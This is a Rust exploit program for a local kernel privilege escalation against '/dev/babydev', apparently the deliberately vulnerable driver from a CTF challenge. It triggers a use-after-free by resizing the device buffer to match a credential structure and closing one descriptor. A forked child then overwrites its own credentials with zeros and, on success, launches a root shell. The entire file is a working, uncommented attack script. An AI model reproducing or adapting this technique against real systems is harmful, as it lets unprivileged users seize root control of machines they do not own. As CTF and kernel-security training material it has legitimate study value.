#![feature(asm_const)]
use anyhow::{self, Context, Ok};
use colored::*;
use core::arch::asm;
use libc::{self, c_void};
use nix::sys::wait::wait;
use nix::unistd::{fork, getuid, write, ForkResult};
use std::arch::global_asm;
use std::fs::OpenOptions;
use std::fs::{self, File};
use std::io::{self, Read, Write};
use std::io::{BufRead, BufReader};
use std::os::fd::AsRawFd;
use std::process;

use std::result::Result;
fn main() -> anyhow::Result<()> {
    println!(
        "{}",
        format!("{}", "[*] Start to exploit...".bold().purple())
    );
    let dev_fd1 = OpenOptions::new()
        .write(true)
        .read(true)
        .open("/dev/babydev")?;
    let mut dev_fd2 = OpenOptions::new()
        .write(true)
        .read(true)
        .open("/dev/babydev")?;
    let fd1 = dev_fd1.as_raw_fd();
    unsafe {
        libc::ioctl(fd1, 0x10001, 0xa8);
        libc::close(fd1);
    };
    match unsafe { fork() } {
        Result::Ok(ForkResult::Child) => {
            let buf: Vec<u8> = vec![0; 30];
            dev_fd2.write_all(&buf[0..28])?;
            match getuid().as_raw() {
                0 => {
                    println!(
                        "{}",
                        format!(
                            "{}",
                            "[+] Successful to get the root. Execve root shell now..."
                                .purple()
                                .bold()
                        )
                    );
                    std::process::Command::new("/bin/sh")
                        .status()
                        .expect("failed to execute process");
                }
                _ => {
                    println!(
                        "{}",
                        format!(
                            "{}",
                            "[x] Unable to get the root, exploit failed."
                                .purple()
                                .bold()
                        )
                    );
                    process::exit(-1);
                }
            }
        }
        Result::Ok(ForkResult::Parent { .. }) => {
            wait()?;
        }
        Result::Err(_) => {
            println!(
                "{}",
                format!(
                    "{}",
                    "[x] Unable to fork the new thread, exploit failed."
                        .red()
                        .bold()
                )
            );
            process::exit(-1);
        }
    }
    Ok(())
}
